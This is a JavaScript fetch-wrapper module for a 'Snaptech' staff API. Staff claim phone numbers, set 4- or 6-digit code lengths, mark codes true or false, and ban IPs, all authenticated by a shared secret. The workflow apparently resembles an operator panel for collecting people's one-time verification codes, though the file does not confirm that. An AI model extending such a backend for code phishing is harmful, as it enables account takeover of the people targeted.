/**
 * api.js — Centralized fetch wrapper for the Snaptech API
 * Provides timeout, consistent error handling and logging.
 */

import { CONFIG } from "../config.js";

const FETCH_TIMEOUT_MS = 8000;

/**
 * Internal fetch with AbortSignal timeout.
 * @param {string} url
 * @param {RequestInit} options
 * @returns {Promise<Response>}
 */
async function fetchWithTimeout(url, options = {}) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
    try {
        return await fetch(url, { ...options, signal: controller.signal });
    } finally {
        clearTimeout(timer);
    }
}

/**
 * Call /api/staff-action
 * @param {string} action   – "claim" | "unclaim" | "set_length" | "wrong_number" | "true_code" | "false_code"
 * @param {string} phone
 * @param {string} staffTag – Discord tag of the acting staff member
 * @param {number|null} length – Required for set_length (4 or 6)
 */
export async function callStaffAction(action, phone, staffTag, length = null) {
    const body = {
        action,
        phone,
        secret: CONFIG.STAFF_SECRET,
        staff_tag: staffTag,
    };
    if (length !== null) body.length = length;

    const res = await fetchWithTimeout(CONFIG.API_BASE + "/api/staff-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
    });

    if (!res.ok) {
        const text = await res.text().catch(() => "");
        throw new Error(`API ${res.status}: ${text}`);
    }

    return res.json();
}

/**
 * Call /api/ban-ip
 * @param {string} ip
 * @param {string} bannedBy – Discord tag
 */
export async function callBanIP(ip, bannedBy) {
    const res = await fetchWithTimeout(CONFIG.API_BASE + "/api/ban-ip", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ip, secret: CONFIG.STAFF_SECRET, banned_by: bannedBy }),
    });

    if (!res.ok) {
        const text = await res.text().catch(() => "");
        throw new Error(`API ${res.status}: ${text}`);
    }

    return res.json();
}
